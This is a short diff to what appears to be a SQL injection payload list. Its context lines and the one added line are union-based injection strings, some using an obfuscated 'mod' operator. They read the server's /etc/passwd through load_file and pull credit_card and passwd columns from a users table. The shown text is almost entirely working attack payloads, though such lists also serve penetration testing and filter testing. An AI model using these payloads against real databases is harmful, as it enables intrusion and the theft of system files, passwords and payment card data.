@@ -566,3 +566,4 @@ binary (binary 1) union select table_name from information_schema.tables
 
 # HT @FluxReiners
 (1)mod @a or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+@a mod (1) or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
